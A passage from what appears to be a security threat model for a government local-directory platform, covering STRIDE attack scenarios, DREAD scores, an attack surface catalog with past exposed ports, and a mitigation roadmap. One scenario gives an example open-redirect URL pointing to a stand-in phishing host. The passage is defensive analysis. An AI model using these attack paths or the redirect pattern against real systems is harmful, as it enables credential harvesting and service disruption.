  4. Attacker uses stolen token to impersonate Nodal Officer.
- **Target Component:** React Frontend Application (`lgd_react` / `lgd-um`).
- **Impact:** Complete account takeover of administrative personnel.
- **Existing Security Controls:** React JSX automatic string escaping on basic bindings.
- **Missing Controls:** Storage of tokens in `HttpOnly` cookies; Content Security Policy (CSP).
- **Detection Mechanism:** WAF rules inspecting API inputs for script injection patterns.
- **Recommended Mitigation:** Store authentication tokens exclusively in `HttpOnly, Secure, SameSite=Strict` cookies.

### Scenario 14: Attacker Exploiting Open Redirects
- **Preconditions:** Manipulated query parameters on login or external links.
- **Attacker Capabilities:** Social engineering / phishing link delivery.
- **Attack Entry Point:** `/api/auth/login?redirect=https://phishing.attacker.com`.
- **Attack Sequence:**
  1. Attacker sends phishing link with official LGD domain and malicious redirect parameter.
  2. Officer logs in successfully.
  3. Frontend or Gateway redirects user to external phishing page mimicking LGD eSign prompt.
  4. Officer enters Aadhaar OTP or credentials on spoofed page.
- **Target Component:** API Gateway Redirect Filter & React Router.
- **Impact:** Credential and OTP harvesting through trusted-domain phishing.
- **Existing Security Controls:** None on redirect destination validation.
- **Missing Controls:** Strict domain allowlisting on redirect URL parameters.
- **Detection Mechanism:** Log monitoring alerting on redirects to external hostnames.
- **Recommended Mitigation:** Validate all redirect URLs against strict internal relative-path regex.

### Scenario 15: Attacker Exhausting API or Document-Processing Resources (DoS)
- **Preconditions:** Unauthenticated internet access.
- **Attacker Capabilities:** High-concurrency HTTP flooding tools (HTTP benchmark scripts).
- **Attack Entry Point:** `POST /api/auth/login` or `POST /api/revenue/attachments/upload`.
- **Attack Sequence:**
  1. Attacker sends thousands of concurrent requests with large payloads to CPU-intensive endpoints.
  2. JVM heap memory is exhausted; Netty event loop threads or Tomcat thread pools become saturated.
  3. PostgreSQL connection pool (`HikariCP`) reaches maximum limit.
  4. Platform becomes completely unresponsive to legitimate government officers.
- **Target Component:** Gateway Netty threads, Tomcat thread pools, and HikariCP database pool.
- **Impact:** System downtime, denial of service for all directory operations nationwide.
- **Existing Security Controls:** None. No rate limiting or thread isolation configured.
- **Missing Controls:** Distributed Redis rate limiter, request body size limits, connection timeouts.
- **Detection Mechanism:** Prometheus / Actuator metrics alerting on thread pool and heap saturation.
- **Recommended Mitigation:** Enforce Gateway Token Bucket rate limiting and strict connection pool bounds.

---

## 8. DREAD Risk Assessment Methodology & Consolidated Scores

Every threat was evaluated using the standard **DREAD** framework:
$$\text{DREAD Score} = \frac{D + R + E + A + \text{Disc}}{5}$$

- **Damage Potential (D):** 1 (negligible) to 10 (catastrophic system takeover / data loss).
- **Reproducibility (R):** 1 (difficult, timing-dependent) to 10 (100% deterministic every attempt).
- **Exploitability (E):** 1 (requires deep internal access/0-day) to 10 (trivial via browser or curl).
- **Affected Users (A):** 1 (single isolated record) to 10 (all government users and directories nationwide).
- **Discoverability (Disc):** 1 (hidden in binary logic) to 10 (public port scan or unauthenticated endpoint).

### Consolidated DREAD Scores Summary Table

| Threat ID | Threat Name | STRIDE | D | R | E | A | Disc | DREAD Score | Risk Level | CVSS v4.0 |
|:---|:---|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
| `THR-STRIDE-001` | JWT Token Forgery via Static HMAC Secret | Spoofing | 10 | 10 | 9 | 10 | 8 | **9.4** | **Critical** | 9.8 |
| `THR-STRIDE-012` | PostgreSQL Direct Host Port Exposure | Info Disc | 10 | 10 | 9 | 10 | 8 | **9.4** | **Critical** | 9.8 |
| `THR-STRIDE-004` | Direct Microservice Ingress Bypassing Gateway | Spoofing | 10 | 10 | 9 | 9 | 8 | **9.2** | **Critical** | 9.8 |
| `THR-STRIDE-011` | Spring Actuator Environment Secret Leakage | Info Disc | 10 | 10 | 9 | 9 | 8 | **9.2** | **Critical** | 9.8 |
| `THR-STRIDE-002` | Rogue Microservice Registration on Eureka | Spoofing | 10 | 10 | 9 | 9 | 7 | **9.0** | **Critical** | 9.8 |
| `THR-STRIDE-003` | CDAC e-Hastakshar Callback Spoofing | Spoofing | 9 | 9 | 9 | 8 | 9 | **8.8** | **Critical** | 9.6 |
| `THR-STRIDE-006` | Role Injection via Mass Assignment | Tampering | 9 | 9 | 8 | 9 | 9 | **8.8** | **Critical** | 9.4 |
| `THR-STRIDE-005` | Cross-Tenant State Draft Tampering (BOLA) | Tampering | 9 | 9 | 8 | 9 | 8 | **8.6** | **Critical** | 9.1 |
| `THR-STRIDE-018` | Missing Method-Level `@PreAuthorize` Security | Elevation | 9 | 9 | 8 | 8 | 8 | **8.4** | **Critical** | 8.8 |
| `THR-STRIDE-007` | Token Blacklist Wipe via Redis `FLUSHALL` | Tampering | 8 | 9 | 9 | 8 | 7 | **8.2** | **Critical** | 8.6 |
| `THR-STRIDE-014` | Client-Side Token Theft via Stored XSS | Info Disc | 8 | 8 | 7 | 8 | 9 | **8.0** | **Critical** | 8.8 |
| `THR-STRIDE-016` | Auth Endpoint Brute-Force Flooding | DoS | 8 | 10 | 9 | 8 | 5 | **8.0** | **Critical** | 7.5 |
| `THR-STRIDE-008` | Government Gazette PDF Hash Substitution | Tampering | 8 | 7 | 7 | 9 | 8 | **7.8** | **High** | 8.8 |
| `THR-STRIDE-019` | District-to-State Approval Escalation | Elevation | 8 | 8 | 7 | 8 | 8 | **7.8** | **High** | 8.8 |
| `THR-STRIDE-015` | Oversized File Upload / Zip Bomb (DoS) | DoS | 8 | 9 | 8 | 7 | 6 | **7.6** | **High** | 7.5 |
| `THR-STRIDE-010` | Gateway Log Unmasked Token Exposure | Repudiation| 8 | 8 | 7 | 7 | 7 | **7.4** | **High** | 7.5 |
| `THR-STRIDE-020` | Client-Side Route Guard Manipulation | Elevation | 6 | 9 | 9 | 6 | 6 | **7.2** | **High** | 6.5 |
| `THR-STRIDE-009` | Missing Entity-Level Change Audit Trails | Repudiation| 7 | 8 | 8 | 5 | 6 | **6.8** | **High** | 7.1 |
| `THR-STRIDE-017` | Regular Expression Denial of Service (ReDoS) | DoS | 7 | 8 | 6 | 7 | 6 | **6.8** | **High** | 7.5 |
| `THR-STRIDE-013` | Swagger / OpenAPI Spec Leakage in Prod | Info Disc | 5 | 10 | 9 | 4 | 9 | **7.4** | **High** | 5.3 |

*(Full matrix available in [DREAD_Risk_Assessment.xlsx](file:///e:/System/Projects/dockerProject/Source%20code/lgd-active-new/DREAD_Risk_Assessment.xlsx) and [DREAD_Risk_Assessment.md](file:///e:/System/Projects/dockerProject/Source%20code/lgd-active-new/DREAD_Risk_Assessment.md))*

---

## 9. Attack Surface Catalog Summary

Thirteen major attack surface categories encompassing all 46 system endpoints were cataloged (detailed in [Attack_Surface_Register.xlsx](file:///e:/System/Projects/dockerProject/Source%20code/lgd-active-new/Attack_Surface_Register.xlsx) and [Attack_Surface_Register.md](file:///e:/System/Projects/dockerProject/Source%20code/lgd-active-new/Attack_Surface_Register.md)):

1. **Authentication Endpoints:** `/api/auth/login`, `/api/auth/logout`, `/api/auth/refresh`.
2. **Administrative APIs:** `/api/users/**`, `/api/users/roles/**`, `/api/entities/**`.
3. **File Upload Handlers:** `/api/revenue/attachments/upload` (multipart streaming).
4. **File Download Handlers:** `/api/revenue/attachments/{id}/download`.
5. **eSign Integration Callback:** `/api/revenue/ehastakshar/callback`.
6. **Internal Microservice Direct Ingress:** Active internal container ports `18090` (Auth), `18089` (UM), `18062` (Revenue) [PRE-REMEDIATION / HISTORICAL BASELINE — Phase 0 Discovery Snapshot: `8081`, `8082`, `8083` open to `0.0.0.0`].
7. **Service Discovery Endpoints:** Eureka Dashboard and `/eureka/apps/**` on internal container port `8761` [PRE-REMEDIATION / HISTORICAL BASELINE — Phase 0 Discovery Snapshot: `0.0.0.0:8761` unauthenticated; Active: HTTP Basic Auth enforced, unmapped from host].
8. **Direct Database Exposure:** PostgreSQL port `5432` [PRE-REMEDIATION / HISTORICAL BASELINE — Phase 0 Discovery Snapshot: `0.0.0.0:5432` published to host; Active: unmapped from host, internal Docker network only].
9. **In-Memory Cache Exposure:** Redis port `6379` [PRE-REMEDIATION / HISTORICAL BASELINE — Phase 0 Discovery Snapshot: `0.0.0.0:6379` published to host without password; Active: loopback `127.0.0.1:6379` / internal Docker network only].
10. **Swagger & OpenAPI Documentation:** `/swagger-ui/**`, `/v3/api-docs` [PRE-REMEDIATION / HISTORICAL BASELINE: exposed in prod; Active: disabled in prod via `@Profile("!prod")`].
11. **Docker Host Published Ports:** [PRE-REMEDIATION / HISTORICAL BASELINE — Phase 0 Discovery Snapshot: Complete TCP attack surface across 7 host ports (`8080`–`8083`, `8761`, `5432`, `6379`); Active: host-published port `8092` only; all internal services and data stores unmapped].
12. **Actuator & Configuration Endpoints:** `/actuator/env`, `/actuator/health`, `/actuator/heapdump` [PRE-REMEDIATION / HISTORICAL BASELINE: unauthenticated env/heapdump; Active: restricted to health/info].
13. **Frontend Runtime Surfaces:** Browser `localStorage`, `sessionStorage`, and React DOM event bindings.

---

## 10. Attack Trees & Data Flow Summary

- **Level 0, 1, and 2 Data Flow Diagrams:** Complete DFD specifications for Authentication, Draft Creation/Attachment, e-Hastakshar eSign Flow, and Gazette Legal Publication are detailed in [LGD_Data_Flow_Diagram.md](file:///e:/System/Projects/dockerProject/Source%20code/lgd-active-new/LGD_Data_Flow_Diagram.md).
- **Attack Trees:** Six comprehensive Mermaid attack trees mapping specific attack paths and defensive countermeasures for Government Master Data Compromise, Multi-Tenant Boundary Bypass, JWT Compromise, eSign Transaction Forgery, Privilege Escalation, and Infrastructure Takeover are provided in [Attack_Tree_Diagrams.md](file:///e:/System/Projects/dockerProject/Source%20code/lgd-active-new/Attack_Tree_Diagrams.md).

---

## 11. Consolidated Threat & Vulnerability Traceability Register

The identified STRIDE threats map directly to established vulnerabilities (`VULN-001` through `VULN-023`) and newly discovered architectural gaps:

| Threat ID | Threat Title | STRIDE | Vuln Ref | CWE | CVSS v4.0 | DREAD | Priority |
|:---|:---|:---:|:---:|:---:|:---:|:---:|:---:|
| `THR-STRIDE-001` | JWT Token Forgery via Static HMAC Secret | Spoofing | `VULN-001` | CWE-798 | 9.8 | 9.4 | **Critical** |
| `THR-STRIDE-002` | Rogue Microservice Registration on Eureka | Spoofing | `VULN-021` | CWE-306 | 9.8 | 9.0 | **Critical** |
| `THR-STRIDE-003` | CDAC e-Hastakshar Callback Spoofing | Spoofing | `VULN-003` | CWE-345 | 9.6 | 8.8 | **Critical** |
| `THR-STRIDE-004` | Direct Microservice Ingress Bypassing Gateway | Spoofing | `VULN-009` | CWE-284 | 9.8 | 9.2 | **Critical** |
| `THR-STRIDE-005` | Cross-Tenant Draft Modification (BOLA) | Tampering | `VULN-006` | CWE-639 | 9.1 | 8.6 | **Critical** |
| `THR-STRIDE-006` | Role Injection via Mass Assignment | Tampering | *[Unassigned]* | CWE-915 | 9.4 | 8.8 | **Critical** |
| `THR-STRIDE-007` | Token Blacklist Invalidation via Redis Flush | Tampering | `VULN-007` | CWE-306 | 8.6 | 8.2 | **Critical** |
| `THR-STRIDE-008` | Government Gazette PDF Hash Substitution | Tampering | `VULN-003` | CWE-354 | 8.8 | 7.8 | **High** |
| `THR-STRIDE-009` | Missing Entity Modification Audit Trails | Repudiation | *[Unassigned]* | CWE-778 | 7.1 | 6.8 | **High** |
| `THR-STRIDE-010` | Bearer Token Exposure in Gateway Logs | Repudiation | `VULN-008` | CWE-532 | 7.5 | 7.4 | **High** |
| `THR-STRIDE-011` | Spring Boot Actuator Secret Key Leakage | Info Disc | *[Unassigned]* | CWE-200 | 9.8 | 9.2 | **Critical** |
| `THR-STRIDE-012` | PostgreSQL Direct Host Port Exposure | Info Disc | `VULN-009` *(Amplifier: `VULN-017`)* | CWE-284 | 9.8 | 9.4 | **Critical** |
| `THR-STRIDE-013` | Swagger / OpenAPI Spec Exposure in Prod | Info Disc | `VULN-013` | CWE-200 | 5.3 | 7.4 | **Medium** |
| `THR-STRIDE-014` | Client-Side Token Theft via Stored XSS | Info Disc | *[Unassigned]* | CWE-79 | 8.8 | 8.0 | **Critical** |
| `THR-STRIDE-015` | Large Multipart File Upload Resource DoS | DoS | `VULN-018` | CWE-400 | 7.5 | 7.6 | **High** |
| `THR-STRIDE-016` | Authentication Flooding & Brute Force | DoS | `VULN-015` | CWE-307 | 7.5 | 8.0 | **Critical** |
| `THR-STRIDE-017` | Regular Expression Denial of Service (ReDoS) | DoS | `VULN-019` | CWE-1333 | 7.5 | 6.8 | **Medium** |
| `THR-STRIDE-018` | Missing Method-Level Security Annotations | Elevation | `VULN-005` | CWE-285 | 8.8 | 8.4 | **Critical** |
| `THR-STRIDE-019` | District-to-State Approval Hierarchy Bypass | Elevation | `VULN-006` | CWE-269 | 8.8 | 7.8 | **High** |
| `THR-STRIDE-020` | Client-Side Route Guard Manipulation | Elevation | *[Unassigned]* | CWE-602 | 6.5 | 7.2 | **Medium** |

*(Full interactive register available in [STRIDE_Threat_Register.xlsx](file:///e:/System/Projects/dockerProject/Source%20code/lgd-active-new/STRIDE_Threat_Register.xlsx) and [STRIDE_Threat_Register.md](file:///e:/System/Projects/dockerProject/Source%20code/lgd-active-new/STRIDE_Threat_Register.md))*

---

## 12. Threat Mitigation Roadmap Summary

The mitigation strategy (detailed in [Threat_Mitigation_Roadmap.md](file:///e:/System/Projects/dockerProject/Source%20code/lgd-active-new/Threat_Mitigation_Roadmap.md)) is structured across four sequential phases:

1. **Tier 0 (Immediate Stop-The-Bleed - Days 1 to 3):**
   - Unbind ports `5432` (PostgreSQL), `6379` (Redis), `8761` (Eureka), and internal service ports `18090`, `18089`, `18062` (**PRE-REMEDIATION / HISTORICAL BASELINE:** `8081`, `8082`, `8083`) from host `0.0.0.0`.
   - Set strong `requirepass` in `redis.conf`.
   - Disable Actuator `/env` and `/heapdump` endpoints in production.
2. **Tier 1 (Cryptographic & Perimeter Integrity - Days 4 to 10):**
   - Migrate JWT signing from symmetric HS256 to asymmetric RS256 with Vault-managed private keys.
   - Enforce CDAC e-Hastakshar callback HMAC validation and one-time Redis nonce verification.
   - Secure Eureka discovery with HTTP Basic authentication.
   - Implement Gateway Redis token-bucket rate limiting on `/api/auth/login`.
3. **Tier 2 (Multi-Tenancy & Authorization Hardening - Days 11 to 21):**
   - Implement `TenantSecurityContext` filter binding SQL lookups to verified JWT `stateCode`.
   - Mandate method-level `@PreAuthorize` on 100% of controller methods.
   - Implement immutable DTOs preventing role mass assignment.
   - Propagate Redis token revocation blacklist checks across all microservices.
4. **Tier 3 (Auditability & Client-Side Defense - Days 22 to 30):**
   - Migrate browser token storage from `localStorage` to `HttpOnly, Secure, SameSite=Strict` cookies.
   - Implement Hibernate Envers entity revision auditing.
   - Enforce strict Content Security Policy (CSP) and input sanitization.
   - Mask Authorization headers and PII in `ApiLoggingFilter`.
